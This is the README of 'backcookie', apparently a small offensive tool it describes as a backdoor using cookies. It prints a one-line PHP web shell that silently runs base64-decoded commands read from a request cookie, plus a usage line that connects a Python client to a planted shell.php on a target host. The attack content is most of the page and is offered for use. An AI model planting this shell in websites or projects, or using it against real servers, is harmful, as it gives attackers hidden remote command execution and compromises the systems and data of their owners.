backcookie
==========

[![Total views](https://sourcegraph.com/api/repos/github.com/jofpin/Backcookie/counters/views.png)](https://sourcegraph.com/github.com/jofpin/Backcookie)

Small backdoor using cookie.

==========

```php
<?php error_reporting(0); system(base64_decode($_COOKIE["yourcookie"])); ?>
```

```
Example: python backcookie.py -u http://target.com/shell.php -c name_cookie
```
Custom command (binfo), You get objective information
```
@pwned:~$ binfo
```

* Inserted in -> [blackarch](http://blackarch.org/tools.html)

## Developer

-------------

Copyright, 2013 by [Jose Pino](http://twitter.com/jofpin)

-------------
